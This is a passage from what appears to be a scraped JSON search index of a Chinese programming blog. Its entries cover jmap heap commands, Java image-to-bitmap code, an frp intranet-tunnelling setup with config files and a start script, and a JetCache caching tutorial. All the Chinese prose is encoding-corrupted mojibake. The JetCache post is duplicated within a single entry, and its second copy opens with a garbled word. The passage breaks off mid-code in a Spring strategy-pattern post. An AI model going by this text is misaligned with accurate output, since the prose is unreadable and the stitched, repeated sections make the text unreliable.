65823008 (62.773712158203125MB) free = 50568928 (48.226287841796875MB) 56.552893836219035% used From Space: capacity = 11534336 (11.0MB) used = 0 (0.0MB) free = 11534336 (11.0MB) 0.0% used To Space: capacity = 11534336 (11.0MB) used = 0 (0.0MB) free = 11534336 (11.0MB) 0.0% used PS Old Generation capacity = 84410368 (80.5MB) used = 13827064 (13.186515808105469MB) free = 70583304 (67.31348419189453MB) 16.380764979013005% used 16171 interned Strings occupying 1390008 bytes. 2ã€æŸ¥çœ‹å †å†…å­˜ä¸­ç±»å ç”¨ä¿¡æ¯\njmap -histo:live \u0026lt;PID\u0026gt; | grep [è¿‡æ»¤ç±»]\n$ jmap -histo:live 7576 | grep com.example. 194: 100 2400 com.example.jetcache.jetcache.model.UserVO 1254: 1 56 com.example.jetcache.jetcache.service.InvalidUserService$$EnhancerBySpringCGLIB$$b2e448c 1255: 1 56 com.example.jetcache.jetcache.service.UserService$$EnhancerBySpringCGLIB$$cec2f015 1664: 1 32 com.example.jetcache.jetcache.JetcacheApplication$$EnhancerBySpringCGLIB$$745909b5 2016: 1 24 com.example.jetcache.jetcache.controller.UserController 2017: 1 24 com.example.jetcache.jetcache.service.InvalidUserService 2018: 1 24 com.example.jetcache.jetcache.service.UserService 2370: 1 16 com.example.jetcache.jetcache.dao.UserDao 2371: 1 16 com.example.jetcache.jetcache.service.UserService$$EnhancerBySpringCGLIB$$cec2f015$$FastClassBySpringCGLIB$$4bd67238 2372: 1 16 com.example.jetcache.jetcache.service.UserService$$FastClassBySpringCGLIB$$764105c0 3ã€ç”Ÿæˆå¹¶å¯¼å‡ºå †ä¿¡æ¯ï¼Œliveæ˜¯å…ˆè§¦å‘gcï¼Œå†ç»Ÿè®¡å¯¼å‡ºä¿¡æ¯\njmap -dump:live,format=b,file=d:\\\\d.bin \u0026lt;PID\u0026gt;\n$ jmap -dump:live,format=b,file=d:\\d.bin 7576 Dumping heap to D:\\d.bin ... Heap dump file created "},{"id":60,"href":"/posts/history/%E5%9B%BE%E7%89%87%E8%BD%ACbitmap%E4%BD%8D%E5%9B%BE/","title":"å›¾ç‰‡è½¬ Bit Mapä½å›¾","section":"æˆ‘çš„åšå®¢","content":"è®°å½•ä¸€ä¸‹å¦‚ä½•ç”Ÿæˆä½å›¾å­—èŠ‚ç \npublic static byte[] imgToInstruct(int o_x, int o_y, int mode, BufferedImage bi) throws Exception{ //å®šä¹‰æŒ‡ä»¤æ‹¼è£…éƒ¨åˆ†å°¾éƒ¨ byte[] i2=\u0026#34;\\r\\n\u0026#34;.getBytes(\u0026#34;utf-8\u0026#34;); //ç”Ÿæˆ2è¿›åˆ¶å­—ç¬¦ä¸² int[] rgb = new int[3]; int width = bi.getWidth(); int height = bi.getHeight(); int wModByte = (width % 8) == 0 ? 0 : 8 - (width % 8); int pixelCount = (width + wModByte) * height; int wPrintByte = (width + wModByte) / 8; StringBuilder res = new StringBuilder(); for (int y = 0; y \u0026lt; height; y++) { for (int x = 0; x \u0026lt; width; x++) { int pixel = bi.getRGB(x, y); // ä¸‹é¢ä¸‰è¡Œä»£ç å°†ä¸€ä¸ªæ•°å­—è½¬æ¢ä¸ºRGBæ•°å­— rgb[0] = (pixel \u0026amp; 0xff0000) \u0026gt;\u0026gt; 16; rgb[1] = (pixel \u0026amp; 0xff00) \u0026gt;\u0026gt; 8; rgb[2] = (pixel \u0026amp; 0xff); String bitStr = (rgb[0] + rgb[1] + rgb[2]) / 3 \u0026gt;= 200 ? \u0026#34;1\u0026#34; : \u0026#34;0\u0026#34;; res.append(bitStr); } for (int k = 0; k \u0026lt; wModByte; k++) { res.append(\u0026#34;1\u0026#34;); } } //ç”ŸæˆäºŒå€¼å›¾ï¼ˆé»‘ç™½å›¾åƒï¼‰å­—èŠ‚æµ String x=res.toString(); byte[] i1 =new byte[x.length()/8]; for(int i=0;i\u0026lt;x.length();i=i+8) { String y =x.substring(i,i+4); String z=x.substring(i+4,i+8); byte y1=Byte.parseByte(y,2); byte z1=Byte.parseByte(z,2); i1[i/8]=(byte)(((byte)(y1\u0026lt;\u0026lt;4)) | z1); } //æ•°ç»„åˆå¹¶ String istr=String.format(\u0026#34;BITMAP %d,%d,%d,%d,%d,\u0026#34;,o_x,o_y,wPrintByte,height,mode); byte[] i0=istr.getBytes(\u0026#34;utf-8\u0026#34;); byte[] retVal =new byte[i0.length + i1.length + i2.length]; System.arraycopy(i0,0,retVal,0,i0.length); System.arraycopy(i1,0,retVal,i0.length,i1.length); System.arraycopy(i2,0,retVal,i0.length+i1.length,i2.length); return retVal; } 2ã€image To byte\npublic static byte[] imageToByte(BufferedImage bi) { int[] rgb = new int[3]; int width = bi.getWidth(); int height = bi.getHeight(); StringBuilder res = new StringBuilder(); int i; String y; for(int x = 0; x \u0026lt; width / 8 * 8; ++x) { for(int y = 0; y \u0026lt; height / 8 * 8; ++y) { i = bi.getRGB(x, y); rgb[0] = (i \u0026amp; 16711680) \u0026gt;\u0026gt; 16; rgb[1] = (i \u0026amp; \u0026#39;\\uff00\u0026#39;) \u0026gt;\u0026gt; 8; rgb[2] = i \u0026amp; 255; y = (rgb[0] + rgb[1] + rgb[2]) / 3 \u0026gt;= 200 ? \u0026#34;0\u0026#34; : \u0026#34;1\u0026#34;; res.append(y); } } String x = res.toString(); byte[] i1 = new byte[x.length() / 8]; for(i = 0; i \u0026lt; x.length(); i += 8) { y = x.substring(i, i + 4); String z = x.substring(i + 4, i + 8); byte y1 = Byte.parseByte(y, 2); byte z1 = Byte.parseByte(z, 2); i1[i / 8] = (byte)((byte)(y1 \u0026lt;\u0026lt; 4) | z1); } byte[] bytes = new byte[]{(byte)(width / 8 % 256), (byte)(width / 8 / 256), (byte)(height / 8 % 256), (byte)(height / 8 / 256)}; bytes = byteMerger(bytes, i1); return bytes; } "},{"id":61,"href":"/posts/history/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%BD%BF%E7%94%A8/","title":"Frpå†…ç½‘ç©¿é€ä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":"ç”±äºé¡¹ç›®è¦å¼€å‘è°ƒè¯•ç¬¬ä¸‰æ–¹çš„å›è°ƒï¼Œå›è°ƒåœ°å€å¿…é¡»æ˜¯å¤–ç½‘çš„ä¸€ä¸ªipåœ°å€æˆ–è€…åŸŸåï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•åº”ç”¨ï¼Œä¸‹é¢æ­å»ºä¸€ä¸ªå¤–ç½‘ç©¿é€æœåŠ¡æ¥ä½¿ç”¨ï¼ŒæŠŠå¤–ç½‘åœ°å€æ˜ å°„åˆ°æœ¬åœ°æœºå™¨ä¸Šã€‚\nä¸ªäººä½¿ç”¨frpæ¥æ­å»ºå†…ç½‘ç©¿é€æœåŠ¡ï¼Œfrpåˆ†ä¸ºfrpsæœåŠ¡ç«¯å’Œfrpcå®¢æˆ·ç«¯ï¼Œæ³¨æ„ï¼Œåœ¨ä½¿ç”¨æ—¶ï¼Œfrpså’Œfrpcçš„ç‰ˆæœ¬è¦ä¸€æ ·ï¼Œä¸ç„¶å¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚\né™„ï¼š\rfrpçš„github åœ°å€\næœåŠ¡ç«¯çš„æ­å»º\r#\r1ã€éœ€è¦ä¸€ä¸ªå¤–ç½‘ip,åŸŸåï¼ŒåŸŸåè§£æåˆ°ipä¸Šï¼Œå¦‚ï¼šfrp.yuanmoc.cnè§£æåˆ°æˆ‘çš„ipä¸Šã€‚\n2ã€ä¸‹è½½frpåˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼Œæˆ‘æ˜¯åœ¨Linuxä¸Šæ­å»ºçš„frpsï¼Œæ‰€ä»¥æˆ‘ä¸‹è½½äº†Linuxç‰ˆæœ¬frpsï¼Œå³frp_0.34.3_linux_amd64.tar.gz ï¼Œè§£å‹ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶ tar -zxvf frp_0.34.3_linux_amd64.tar.gz ï¼Œå…¶ä¸­ frps å’Œ frps.ini æ˜¯æˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶ï¼Œæ³¨æ„frpsè¦æœ‰å¯æ‰§è¡Œçš„æƒé™ï¼Œå³\nchmod +x frps` 3ã€ç¼–å†™ä¿®æ”¹ frps.ini é…ç½®æ–‡ä»¶\n[common] bind_addr = 0.0.0.0 # å…¨éƒ¨å®¢æˆ·ç«¯å¯è¿æ¥ bind_port = 7000 # ç»‘å®šçš„ç«¯å£ï¼Œåœ¨å®¢æˆ·ç«¯ä¸Šè¦å¯¹åº” vhost_http_port = 8000 # æ˜ å°„çš„httpè¯·æ±‚ç«¯å£ # å®‰å…¨èµ·è§ï¼ŒåŠ ä¸Šæˆæƒ authentication_method = token # æˆæƒæ–¹å¼token token = xxx # tokençš„å€¼ï¼Œè¦åœ¨å®¢æˆ·ç«¯çš„commonæ·»åŠ æ­¤æˆæƒ 4ã€å¯åŠ¨æœåŠ¡ç«¯ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæ‰§è¡Œ\nfrps -c frps.ini 5ã€å¯åŠ¨æˆåŠŸåä¼šæœ‰å¦‚ä¸‹æ—¥å¿—\n2021/01/09 22:05:16 [I] [service.go:190] frps tcp listen on 0.0.0.0:7000 2021/01/09 22:05:16 [I] [service.go:232] http service listen on 0.0.0.0:8080 2021/01/09 22:05:16 [I] [root.go:215] start frps success å®¢æˆ·ç«¯çš„æ­å»º\r#\r1ã€ä¸‹è½½å®¢æˆ·ç«¯ï¼Œç”±äºæˆ‘è¦åœ¨Windowsä¸Šä½¿ç”¨ï¼Œæ‰€ä»¥å°±ä¸‹è½½äº†ä¸ªWindowsç‰ˆæœ¬ï¼Œå³frp_0.34.3_windows_amd64.zipï¼Œè§£å‹ï¼Œå…¶ä¸­ frpc å’Œ frpc.ini æ˜¯æˆ‘ä»¬è¦ä½¿ç”¨åˆ°çš„ï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œfrpcæ˜¯å®¢æˆ·ç«¯çš„è€Œfrpsæ˜¯æœåŠ¡ç«¯çš„ï¼Œåˆ«æé”™äº†å“¦ã€‚\n2ã€ç¼–å†™é…ç½®æ–‡ä»¶ frpc.ini\n[common] server_addr = x.x.x.x # åˆšæ‰æœåŠ¡ç«¯çš„å¤–ç½‘ipåœ°å€ server_port = 7000 # æœåŠ¡ç«¯çš„ç»‘å®šçš„ç«¯å£ï¼Œå³ bind_port çš„å€¼ token = xxx # æˆæƒtoken # ssh è¿æ¥ï¼Œç›®å‰æ²¡æœ‰ç”¨åˆ° [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 6000 # web æœåŠ¡ï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬éœ€è¦çš„ [web] type = http # ç±»å‹æ˜¯http,å½“ç„¶è¿˜ä¼šæœ‰httpsç±»å‹ local_port = 8080 # æœ¬åœ°ä½ webæœåŠ¡å¯åŠ¨çš„ç«¯å£ custom_domains = frp.yuanmoc.cn # ä¸€å¼€å§‹ä½ è§£æçš„åŸŸå # å¯ä»¥æœ‰å¤šä¸ªï¼Œå½“ç„¶æˆ‘è¿™é‡Œä¸€ä¸ªå°±å¤Ÿç”¨äº† #[web2] #type = http #local_port = 8081 #custom_domains = frp2.yuanmoc.cn 3ã€å¯åŠ¨å®¢æˆ·ç«¯\n./frpc.exe -c frpc.ini å¯åŠ¨æˆåŠŸåï¼Œåœ¨å®¢æˆ·ç«¯ä¼šæ˜¾ç¤ºå¦‚ä¸‹æ—¥å¿—ï¼š\n2021/01/09 22:06:42 [I] [service.go:288] [ad516891811f3c34] login to server success, get run id [ad516891811f3c34], server udp port [0] 2021/01/09 22:06:42 [I] [proxy_manager.go:144] [ad516891811f3c34] proxy added: [ssh web] 2021/01/09 22:06:42 [I] [control.go:180] [ad516891811f3c34] [ssh] start proxy success 2021/01/09 22:06:42 [I] [control.go:180] [ad516891811f3c34] [web] start proxy success åœ¨æœåŠ¡ç«¯ä¹Ÿä¼šæ˜¾ç¤ºå¦‚ä¸‹æ—¥å¿—ï¼š\n2021/01/09 22:06:41 [I] [service.go:444] [ad516891811f3c34] client login info: ip [119.123.72.17:14167] version [0.34.3] hostname [] os [windows] arch [amd64] 2021/01/09 22:06:41 [I] [tcp.go:63] [ad516891811f3c34] [ssh] tcp proxy listen port [6000] 2021/01/09 22:06:41 [I] [control.go:446] [ad516891811f3c34] new proxy [ssh] success 2021/01/09 22:06:41 [I] [http.go:92] [ad516891811f3c34] [web] http proxy listen for host [frp.yuanmoc.cn] location [] group [] 2021/01/09 22:06:41 [I] [control.go:446] [ad516891811f3c34] new proxy [web] success 4ã€è¿™ä¸‹å°±å¯ä»¥é€šè¿‡å¤–ç½‘çš„åŸŸåå»è°ƒè¯•ä½ æœ¬åœ°çš„é¡¹ç›®äº†\nå¤–ç½‘è®¿é—®http://frp.yuanmoc.cn:8000å°±ä¼šæ˜ å°„åˆ°æœ¬åœ°çš„http://localhost:8080ä¸Šï¼Œç”¨äºè°ƒè¯•æŸäº›apiçš„å›è°ƒéå¸¸æ–¹ä¾¿ã€‚ http://frp.yuanmoc.cn:8000 -\u0026gt; http://localhost:8080 å…¶ä¸­8000ç«¯å£æ˜¯ä½ åœ¨frpæœåŠ¡ç«¯è®¾ç½®çš„vhost_http_portï¼Œ8080æ˜¯å®¢æˆ·ç«¯è®¾ç½®çš„local_portï¼Œä¹Ÿæ˜¯ä½ webé¡¹ç›®å¯åŠ¨çš„ç«¯å£ã€‚\næœåŠ¡ç«¯åå°å¯åŠ¨\r#\rä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œä¸€èˆ¬æœåŠ¡ç¨‹åºéƒ½ä¼šåœ¨åå°å¯åŠ¨ï¼Œè¿™é‡Œä¹Ÿç¼–å†™ä¸€ä¸ªè„šæœ¬æ¥ä½¿ç”¨ï¼Œè¿™é‡Œçš„start.shï¼Œfrpsï¼Œfrps.iniéƒ½åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ã€‚\n1ã€åˆ›å»ºæ–‡ä»¶å¹¶ç»™äºˆå¯æ‰§è¡Œæƒé™\ntouch start.sh chmod +x start.sh 2ã€æŠŠä»¥ä¸‹å†…å®¹æ·»åŠ åˆ°start.shæ–‡ä»¶\n#!/bin/bash # å¯åŠ¨ start(){ echo \u0026#34;start frps......\u0026#34; nohup ./frps -c ./frps.ini \u0026gt; frps.log 2\u0026gt;\u0026amp;1 \u0026amp; echo $! \u0026gt; $PIDFILE if [ $? -ne 0 ] then echo \u0026#34;Could not create PID file\u0026#34; exit 1 else echo \u0026#34;frps running......\u0026#34; fi } # åœæ­¢ stop(){ PID=$1 ps -p $PID \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 if [ $? -eq 0 ] then echo \u0026#34;stop frps......\u0026#34; kill -9 $PID echo \u0026#34;stop completing......\u0026#34; fi } # é‡å¯ restart(){ stop $1 start } PIDFILE=./frps.pid if [ -f $PIDFILE ] then PID=$(cat $PIDFILE) restart $PID else start fi 3ã€æ‰§è¡Œ\n./start.sh æœ€åé™„ä¸Š\rå®˜æ–¹æ–‡æ¡£ï¼Œå­¦ä¹ æ›´å¤šã€‚\n"},{"id":62,"href":"/posts/history/jetcache%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"Jet Cacheçš„ä½¿ç”¨","section":"æˆ‘çš„åšå®¢","content":"jetcahceæ˜¯é˜¿é‡Œå‡ºå“çš„ä¸€å¥—ç¼“å­˜ç³»ç»Ÿï¼Œä¸‹é¢è¿›è¡Œç®€å•çš„ä½¿ç”¨ï¼ŒåŒæ—¶é™„ä¸Š\rå®˜æ–¹æ–‡æ¡£åœ°å€ã€‚\nä½¿ç”¨lettuceå®¢æˆ·ç«¯è¿æ¥redisçš„æ–¹å¼ï¼ˆjetcahceé‡Œé¢æœ‰jediså’Œlettuceä¸¤ç§è¿æ¥redisçš„æ–¹å¼ï¼Œä¸ªäººæ¯”è¾ƒå–œæ¬¢ä½¿ç”¨lettuceï¼Œå› ä¸ºä»–æ˜¯ä½¿ç”¨nettyå®ç°çš„ï¼Œæ•ˆç‡æ¯”è¾ƒé«˜ï¼ŒåŒæ—¶æ˜¯å¤šçº¿ç¨‹å®‰å…¨çš„ï¼‰ã€‚\n1ã€æ·»åŠ jetcache-starter-redis-lettuceå’Œjetcache-starter-redisä¾èµ–\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alicp.jetcache\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jetcache-starter-redis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.5.14\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alicp.jetcache\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jetcache-starter-redis-lettuce\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.6.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2ã€ä¸ºjetcacheé…ç½®è¿œç¨‹è¿æ¥rediså’Œæœ¬åœ°ç¼“å­˜\njetcache: statIntervalMinutes: 15 areaInCacheName: false # æœ¬åœ°ç¼“å­˜ï¼Œä½¿ç”¨linkedhashmapå®ç° local: default: type: linkedhashmap keyConvertor: fastjson # è¿œç¨‹ç¼“å­˜ï¼Œä½¿ç”¨lettuceçš„æ–¹å¼è¿æ¥ remote: default: type: redis.lettuce keyConvertor: fastjson uri: redis://password@127.0.0.1:6379/ valueEncoder: java valueDecoder: java poolConfig: minIdle: 5 maxIdle: 20 maxTotal: 50 3ã€æ·»å¯åŠ¨é…ç½® @EnableMethodCacheæ³¨è§£æ˜¯æ¿€æ´»@Cachedæ³¨è§£çš„ @EnableCreateCacheAnnotationæ³¨è§£æ˜¯æ¿€æ´»CreateCacheæ³¨è§£çš„\n@SpringBootApplication @EnableMethodCache(basePackages = \u0026#34;com.example.jetcache.jetcache\u0026#34;) @EnableCreateCacheAnnotation public class JetcacheApplication { public static void main(String[] args) { SpringApplication.run(JetcacheApplication.class, args); } } 4ã€ç®€å•ä½¿ç”¨\n@Service public class UserService { @CreateCache(name = \u0026#34;user\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) private Cache\u0026lt;String, UserVO\u0026gt; userCache; @CreateCache(name = \u0026#34;userList\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) private Cache\u0026lt;String, List\u0026lt;UserVO\u0026gt;\u0026gt; usersCache; @Resource private UserDao userDao; @Cached(name = \u0026#34;userList\u0026#34;, key = \u0026#34;\u0026#39;\u0026#39;\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) public List\u0026lt;UserVO\u0026gt; getUserList() { return userDao.getUserList(); } @Cached(name = \u0026#34;user\u0026#34;, key = \u0026#34;#id\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) public UserVO getById(Integer id) { return userDao.getById(id); } @CacheUpdate(name=\u0026#34;user.\u0026#34;, key=\u0026#34;#user.id\u0026#34;, value=\u0026#34;#user\u0026#34;) void updateUser(UserVO user) { userDao.updateUser(user); } @CacheInvalidate(name=\u0026#34;user\u0026#34;, key=\u0026#34;#userId\u0026#34;) void deleteUser(Integer userId) { userDao.deleteUser(userId); } public Boolean deleteById(Integer id) { userCache.REMOVE(String.valueOf(id)); usersCache.REMOVE(\u0026#34;\u0026#34;); return userDao.deleteById(id); } } 5ã€ä½¿ç”¨è¿‡ç¨‹ä¸­ç¼“å­˜æ²¡æœ‰å¤±æ•ˆé—®é¢˜\nåœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œå‡ºç°äº†ä¸€æ¬¡ç¼“å­˜æ— æ•ˆï¼Œä½¿ç”¨çš„æ—¶å€™æäº†ä»¥ä¸‹æ“ä½œã€‚ ftcahceæ˜¯é˜¿é‡Œå‡ºå“çš„ä¸€å¥—ç¼“å­˜ç³»ç»Ÿï¼Œä¸‹é¢è¿›è¡Œç®€å•çš„ä½¿ç”¨ï¼ŒåŒæ—¶é™„ä¸Š\rå®˜æ–¹æ–‡æ¡£åœ°å€ã€‚\nä½¿ç”¨lettuceå®¢æˆ·ç«¯è¿æ¥redisçš„æ–¹å¼ï¼ˆjetcahceé‡Œé¢æœ‰jediså’Œlettuceä¸¤ç§è¿æ¥redisçš„æ–¹å¼ï¼Œä¸ªäººæ¯”è¾ƒå–œæ¬¢ä½¿ç”¨lettuceï¼Œå› ä¸ºä»–æ˜¯ä½¿ç”¨nettyå®ç°çš„ï¼Œæ•ˆç‡æ¯”è¾ƒé«˜ï¼ŒåŒæ—¶æ˜¯å¤šçº¿ç¨‹å®‰å…¨çš„ï¼‰ã€‚\n1ã€æ·»åŠ jetcache-starter-redis-lettuceå’Œjetcache-starter-redisä¾èµ–\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alicp.jetcache\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jetcache-starter-redis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.5.14\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alicp.jetcache\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jetcache-starter-redis-lettuce\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.6.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 2ã€ä¸ºjetcacheé…ç½®è¿œç¨‹è¿æ¥rediså’Œæœ¬åœ°ç¼“å­˜\njetcache: statIntervalMinutes: 15 areaInCacheName: false # æœ¬åœ°ç¼“å­˜ï¼Œä½¿ç”¨linkedhashmapå®ç° local: default: type: linkedhashmap keyConvertor: fastjson # è¿œç¨‹ç¼“å­˜ï¼Œä½¿ç”¨lettuceçš„æ–¹å¼è¿æ¥ remote: default: type: redis.lettuce keyConvertor: fastjson uri: redis://password@127.0.0.1:6379/ valueEncoder: java valueDecoder: java poolConfig: minIdle: 5 maxIdle: 20 maxTotal: 50 3ã€æ·»å¯åŠ¨é…ç½® @EnableMethodCacheæ³¨è§£æ˜¯æ¿€æ´»@Cachedæ³¨è§£çš„ @EnableCreateCacheAnnotationæ³¨è§£æ˜¯æ¿€æ´»CreateCacheæ³¨è§£çš„\n@SpringBootApplication @EnableMethodCache(basePackages = \u0026#34;com.example.jetcache.jetcache\u0026#34;) @EnableCreateCacheAnnotation public class JetcacheApplication { public static void main(String[] args) { SpringApplication.run(JetcacheApplication.class, args); } } 4ã€ç®€å•ä½¿ç”¨\n@Service public class UserService { @CreateCache(name = \u0026#34;user\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) private Cache\u0026lt;String, UserVO\u0026gt; userCache; @CreateCache(name = \u0026#34;userList\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) private Cache\u0026lt;String, List\u0026lt;UserVO\u0026gt;\u0026gt; usersCache; @Resource private UserDao userDao; @Cached(name = \u0026#34;userList\u0026#34;, key = \u0026#34;\u0026#39;\u0026#39;\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) public List\u0026lt;UserVO\u0026gt; getUserList() { return userDao.getUserList(); } @Cached(name = \u0026#34;user\u0026#34;, key = \u0026#34;#id\u0026#34;, expire = UserConstants.CACHE_TIME_EXPIRE, cacheType = CacheType.REMOTE) public UserVO getById(Integer id) { return userDao.getById(id); } @CacheUpdate(name=\u0026#34;user.\u0026#34;, key=\u0026#34;#user.id\u0026#34;, value=\u0026#34;#user\u0026#34;) void updateUser(UserVO user) { userDao.updateUser(user); } @CacheInvalidate(name=\u0026#34;user\u0026#34;, key=\u0026#34;#userId\u0026#34;) void deleteUser(Integer userId) { userDao.deleteUser(userId); } public Boolean deleteById(Integer id) { userCache.REMOVE(String.valueOf(id)); usersCache.REMOVE(\u0026#34;\u0026#34;); return userDao.deleteById(id); } } 5ã€ä½¿ç”¨è¿‡ç¨‹ä¸­ç¼“å­˜æ²¡æœ‰ç”Ÿæ•ˆé—®é¢˜\nåœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œå‡ºç°äº†ä¸€æ¬¡ç¼“å­˜æ— æ•ˆï¼Œä½¿ç”¨çš„æ—¶å€™æäº†ä»¥ä¸‹æ“ä½œã€‚\n1ã€åœ¨å¤–éƒ¨è°ƒç”¨getUseræ–¹æ³•ï¼Œè€Œåœ¨ç±»å†…è°ƒç”¨createCacheæ–¹æ³•ï¼ŒåŒæ—¶ç¼“å­˜ä½œç”¨åœ¨createCacheä¸­ï¼Œè¿™æ—¶ç¼“å­˜å°±æ²¡æœ‰æ•ˆæœã€‚\n@Service public class InvalidUserService { @Resource private UserDao userDao; public UserVO getUser(UserVO userVO) { return createCache(userVO.getId()); } @Cached(name = \u0026#34;user\u0026#34;, key = \u0026#34;#userId\u0026#34;) public UserVO createCache(Integer userId) { return userDao.getById(userId); } } ä¸»è¦çš„åŸå› æ˜¯AOPåˆ‡é¢æ—¶ï¼Œé€šè¿‡ä»£ç†ç±»è°ƒç”¨äº†getUseræ–¹æ³•ï¼Œå†åœ¨å†…éƒ¨è°ƒç”¨äº†createCacheæ–¹æ³•ï¼Œè¿™æ—¶ï¼ŒcreateCacheæ–¹æ³•æ²¡æœ‰ç»è¿‡ä»£ç†ç±»çš„è°ƒç”¨ï¼Œæ‰€ä»¥æ³¨è§£å°±æ²¡æœ‰æ•ˆæœã€‚ç„¶åæˆ‘ä»¬çš„è§£å†³æ–¹æ³•æ˜¯è®©æˆ‘ä»¬çš„æ–¹æ³•èµ°ä»£ç†å°±å¯ä»¥äº†ã€‚\n2ã€æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢æ–¹æ³•æ¥ä½¿å…¶èµ°åˆ°ä»£ç†ç±»çš„è°ƒç”¨ ï¼ˆ1ï¼‰æŠŠ getUseræ–¹æ³• ä¸ createCache æ–¹æ³•å†™äºä¸åŒçš„ç±»ä¸­ã€‚ ï¼ˆ2ï¼‰å°†è‡ªèº«æ³¨å…¥åˆ°ç±»ä¸­ï¼Œå¹¶è°ƒç”¨ï¼Œå¼ºè¡Œèµ°ä»£ç†ï¼Œå³\n@Service public class InvalidUserService { @Resource InvalidUserService self; @Resource private UserDao userDao; public UserVO getUser(UserVO userVO) { return self.createCache(userVO.getId()); } @Cached(name = \u0026#34;user\u0026#34;, key = \u0026#34;#userId\u0026#34;) public UserVO createCache(Integer userId) { return userDao.getById(userId); } } ï¼ˆ3ï¼‰é€šè¿‡ApplicationContextè·å–ä»£ç†å¯¹è±¡ï¼Œç„¶åèµ°ä»£ç†\n@Service public class InvalidUserService { @Resource private ApplicationContext applicationContext; @Resource private UserDao userDao; public UserVO getUser(UserVO userVO) { return applicationContext.getBean(InvalidUserService.class).createCache(userVO.getId()); } @Cached(name = \u0026#34;user\u0026#34;, key = \u0026#34;#userId\u0026#34;) public UserVO createCache(Integer userId) { return userDao.getById(userId); } } "},{"id":63,"href":"/posts/history/%E4%BD%BF%E7%94%A8spring%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AD%96%E7%95%A5/","title":"ä½¿ç”¨ Springå®ç°ä¸€ä¸ªç­–ç•¥","section":"æˆ‘çš„åšå®¢","content":"åœ¨å¾ˆå¤šåœºæ™¯ä¸­ï¼Œæˆ‘ä»¬éƒ½éœ€è¦æ ¹æ®ä¸åŒçš„è¡Œä¸ºè°ƒç”¨ä¸åŒçš„ä¸€ä¸ªå®ç°ä¸šåŠ¡é€»è¾‘ï¼Œè¿™é‡Œå°±å¯ä»¥ä½¿ç”¨ç­–ç•¥æ¨¡å¼æ¥å®ç°ã€‚\nä¸‹é¢åœ¨Springä¸­æ¥å®ç°ä¸€ä¸ªç­–ç•¥æ¨¡å¼,åœºæ™¯ï¼šæ ¹æ®ä¸åŒçš„æ‰“å°æ–¹å¼ï¼Œè°ƒç”¨ä¸åŒçš„æ‰“å°æŒ‡ä»¤ã€‚\nä¸‹é¢ä¸»è¦ä½¿ç”¨äº†æ³¨è§£ä¸Spring BeanPostProcessor ç›¸ç»“åˆï¼Œåœ¨é¡¹ç›®å¯åŠ¨æ—¶ï¼Œå°†æ³¨è§£çš„ç±»æ·»åŠ åˆ°PrinterStrategyä¸­ç®¡ç†ï¼Œç„¶åé€šè¿‡ä¼ è¿‡æ¥çš„å‚æ•°è·å–ç›¸åº”çš„ç±»å»æ‰§è¡Œã€‚\n1ã€åˆ›å»ºä¸€ä¸ªæšä¸¾ç±»ï¼Œè®°å½•ç±»å‹\npublic enum PrinterEnum { ESC,TSC } 2ã€åˆ›å»ºä¸€ä¸ªæ³¨è§£ç±»ï¼Œç”¨äºæ·»åŠ æ ‡è¯†ç±»å‹å¹¶äº¤äºSpringç®¡ç†\n@Target(value = ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Component public @interface PrinterAnnotation { /** * type ç±»åˆ« * @return */ PrinterEnum type() default PrinterEnum.ESC; String description() default \u0026#34;\u0026#34;; } 3ã€åˆ›å»ºä¸€ä¸ªæŠ½è±¡æ‰“å°ç±»\npublic abstract class PrinterAbstract { public abstract void getPrintEsc(); } 4ã€å®ç°ä¸¤ç§æ‰“å°æ–¹å¼ï¼Œå¹¶ä¸ºå…¶åŠ ä¸Šæ‰“å°æ³¨è§£\n@PrinterAnnotation(type = PrinterEnum.ESC) public class 